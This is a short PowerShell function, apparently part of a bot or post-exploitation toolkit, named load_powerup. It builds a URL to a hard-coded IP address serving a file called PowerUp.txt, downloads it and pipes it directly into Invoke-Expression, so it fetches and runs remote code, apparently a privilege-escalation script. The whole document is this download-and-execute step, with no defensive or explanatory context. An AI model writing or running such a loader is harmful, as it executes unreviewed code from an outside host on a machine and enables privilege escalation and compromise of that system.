function load_powerup
{
    $comando = "PowerUp"
    $ip="35.165.190.126:80"
    $uri="http://"
    $uri+=$ip;$uri+="/PS_Bot/";
    $uri+=$comando
    $uri+=".txt"
    $uri
    Invoke-WebRequest $uri  -usebasicparsing | Invoke-Expression
}